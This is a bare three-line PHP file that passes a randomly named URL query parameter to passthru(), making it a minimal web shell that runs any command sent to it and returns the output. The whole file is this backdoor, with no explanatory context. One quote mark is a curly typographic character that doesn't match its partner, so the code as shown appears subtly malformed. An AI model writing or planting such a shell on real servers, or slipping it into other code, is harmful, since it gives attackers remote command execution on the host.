<?php
passthru($_GET[’RTEvtsGM']);
?>
